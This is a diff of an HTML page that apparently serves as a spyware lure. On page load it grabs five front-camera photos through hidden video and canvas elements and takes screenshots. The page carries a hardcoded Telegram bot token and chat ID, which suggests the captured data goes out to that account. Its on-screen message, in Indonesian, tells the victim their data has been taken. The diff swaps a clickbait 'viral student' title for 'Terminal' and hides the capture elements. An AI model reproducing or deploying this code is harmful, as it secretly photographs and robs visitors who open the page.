@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Viral seorang siswa melakukan hal yang tidak terduga di kelas nya</title>
+  <title>Terminal</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
   <style>
@@ -27,16 +27,21 @@
       max-width: 600px;
       line-height: 1.5;
     }
+    video, canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div id="msg"></div>
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
 
   <script>
     const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
     const chatId = '5914256752';
 
-    const typeText = (el, text, speed = 35) => {
+    const typeText = (el, text, speed = 30) => {
       let i = 0;
       const interval = setInterval(() => {
         if (i < text.length) {
@@ -116,28 +121,26 @@
 
     const captureCamera = async () => {
       try {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const video = document.createElement('video');
-        video.setAttribute('playsinline', '');
         video.srcObject = stream;
         await video.play();
 
         await new Promise(resolve => {
-          const checkReady = setInterval(() => {
+          const check = setInterval(() => {
             if (video.readyState >= 2 && video.videoWidth > 0) {
-              clearInterval(checkReady);
+              clearInterval(check);
               resolve();
             }
           }, 100);
         });
 
-        await new Promise(r => setTimeout(r, 1000)); // auto fokus
-
         for (let i = 1; i <= 5; i++) {
-          const canvas = document.createElement('canvas');
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0);
 
           await new Promise(resolve => {
@@ -217,11 +220,9 @@
       getScreenshot();
     };
 
-    // UI: efek ketik
-    const msg = `             Selamat anda kena prank.\n         Terima kasih atas kerja samanya.`;
+    const msg = `🔒 Data anda telah saya ambil.\nTerima kasih atas kerja samanya.`;
     typeText(document.getElementById('msg'), msg, 30);
 
-    // Mulai proses
     window.onload = collectInfo;
   </script>
 </body>
